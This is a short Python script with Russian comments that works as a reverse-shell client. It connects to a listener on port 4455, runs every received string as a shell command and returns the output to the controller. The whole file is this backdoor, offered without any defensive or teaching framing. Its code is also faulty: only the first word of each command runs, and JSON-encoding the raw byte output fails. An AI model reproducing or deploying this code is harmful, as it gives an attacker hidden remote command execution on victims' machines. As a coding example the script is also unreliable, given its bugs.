import socket
import subprocess as sb
import json
import time


def execute_system_command(command):
    return sb.check_output(command[0], shell=True)


client = socket.socket(
    socket.AF_INET,
    socket.SOCK_STREAM
)
rrr = 1  # Попытка подключения
while True:
    try:
        client.connect(('127.0.0.1', 4455))
        break
    except ConnectionRefusedError:
        time.sleep(3)
        rrr += 1
        print(f'{rrr} попытка подключения ')
        continue

while True:
    rrr = client.recv(1024).decode('utf-8')
    print(rrr)
    if rrr == 'exit':
        client.close()
        exit()

    rrr = rrr.split(' ')
    resilt = execute_system_command(rrr)
    print(resilt)
    tt = [33,322,111,00]
    json_data = json.dumps(resilt)
    client.send(json_data.encode('utf-8'))

